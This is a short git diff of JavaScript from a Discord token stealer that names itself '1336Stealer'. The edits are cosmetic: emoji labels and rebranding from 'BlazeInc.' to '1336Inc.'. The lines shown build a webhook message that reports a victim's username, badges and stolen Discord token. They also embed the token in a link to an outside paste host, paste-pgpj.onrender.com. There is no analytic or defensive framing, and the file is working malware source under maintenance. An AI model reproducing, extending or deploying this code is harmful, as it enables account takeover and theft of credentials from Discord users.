@@ -287,11 +287,11 @@ async function FirstTime() {
                                 value: `\`${b.username}#${b.discriminator}\``,
                                 inline: !0
 								}, {
-                                name: ":pushpin: Badges",
+                                name: "<:badges:1057623862369587200> Badges",
                                 value: `${GetBadges(b.flags)}`,
                                 inline: !0
 								}, {
-                                name: "Token",
+                                name: "<:discord:1057626154523168768> Token",
                                 value: `\`\`\`${token}\`\`\`\n[Copy](https://paste-pgpj.onrender.com/?p=${token})`,
                                 inline: !1
 								}],
@@ -325,7 +325,7 @@ async function FirstTime() {
                                 username: "1336Stealer",
                                 content: "",
                                 embeds: [{
-                                    title: "1336Stealer, Powered By BlazeInc.",
+                                    title: "1336Stealer, Powered By 1336Inc.",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
